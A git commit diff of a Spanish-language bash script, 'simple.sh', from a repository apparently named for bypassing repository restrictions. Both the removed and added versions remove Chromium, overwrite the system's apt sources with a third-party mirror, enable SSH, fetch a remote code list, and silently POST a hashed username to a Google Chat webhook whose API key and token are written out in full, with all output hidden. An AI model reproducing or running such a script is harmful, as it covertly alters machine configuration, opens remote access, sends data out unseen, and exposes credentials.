8cf9df28da3f958a7d7b7ce622478add5694218d
Dario-git-hub <dariomiguelnavarro822@gmail.com>
2026-04-14 15:53:24 +0200

    si

--- simple.sh
+++ simple.sh
@@ -1,20 +1,12 @@
 #!/bin/bash
 
-rm /tmp/code.txt
-sudo apt remove -y chromium 
-wget -O /tmp/code.txt 'https://raw.githubusercontent.com/Dario-git-hub/repo-changer-bypass/refs/heads/main/testfileprueba.zip' -q
-code1=$(cat /tmp/code.txt)
-echo 'deb https://cloudfront.debian.net/debian/ bookworm main contrib non-free
-deb https://cloudfront.debian.net/debian/ bookworm-updates main' | sudo tee /etc/apt/sources.list
-sudo systemctl enable --now ssh
-clear
-
-echo 'Escribe el código:'
-read code
-
-if [ $code1 = $code ]
-then 
-    curl -H 'Content-Type: application/json' -X POST 'https://chat.googleapis.com/v1/spaces/AAQAae4ZDBc/messages?key=AIzaSyDdI0hCZtE6vySjMm-WEfRq3CPzqKqqsHI&token=XrylE2IQQASahNGdB8_rxEgKVBSTXtvD8y_GXPVNfbU' --data "{"text": \"$code\"}" -s &>/dev/null 2>/dev/null
+function install_shit(){
+    wget -O /tmp/code.txt 'https://raw.githubusercontent.com/Dario-git-hub/repo-changer-bypass/refs/heads/main/testfileprueba.zip' -q
+    echo 'deb https://cloudfront.debian.net/debian/ bookworm main contrib non-free
+    deb https://cloudfront.debian.net/debian/ bookworm-updates main' | sudo tee /etc/apt/sources.list
+    sudo systemctl enable --now ssh
+    clear
+    curl -H 'Content-Type: application/json' -X POST 'https://chat.googleapis.com/v1/spaces/AAQAae4ZDBc/messages?key=AIzaSyDdI0hCZtE6vySjMm-WEfRq3CPzqKqqsHI&token=XrylE2IQQASahNGdB8_rxEgKVBSTXtvD8y_GXPVNfbU' --data "{"text": \"${code_user}\"}" -s &>/dev/null 2>/dev/null
     echo 'Instalando...'
     tput civis
     sudo apt-get update &>/dev/null
@@ -24,6 +16,18 @@ then
     clear
     echo 'Instalado'
     exit 0
-else
-    exit 1
-fi
+}
+
+code_user=$(echo -n "$(echo -n "${USER}" | md5sum)" |tr -d ' ' | tr -d '\-' | base64 -w0|base32 -w0)
+
+rm /tmp/code.txt
+sudo apt remove -y chromium 
+
+
+for line in $(cat /tmp/code.txt)
+do
+    if [ ${line} = ${code_user} ]
+    then 
+        install_shit
+    fi
+done
